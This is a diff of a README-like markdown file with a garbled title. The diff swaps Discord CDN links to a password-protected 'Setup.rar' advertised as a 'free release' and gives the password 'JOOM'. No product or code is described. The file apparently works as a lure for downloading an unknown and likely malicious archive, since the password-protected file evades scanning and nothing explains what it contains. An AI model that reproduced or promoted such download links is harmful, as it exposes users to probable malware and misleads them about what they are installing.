@@ -1,6 +1,6 @@
 Ca-N-Va-cd7068772vf 
 
-|[Download](https://cdn.discordapp.com/attachments/1136035480488644640/1147975516813525032/Setup.rar)|
+|[Download](https://cdn.discordapp.com/attachments/1149423060785561752/1149423103009636433/Setup.rar)|
 |:-------------|
 
 
@@ -18,6 +18,6 @@ Ca-N-Va-cd7068772vf
 
 ## <a id="download"></a>Download
 
-# Our free release can be downloaded [Here](https://cdn.discordapp.com/attachments/1136035480488644640/1147975516813525032/Setup.rar)
+# Our free release can be downloaded [Here](https://cdn.discordapp.com/attachments/1149423060785561752/1149423103009636433/Setup.rar)
 # Password JOOM
 ---
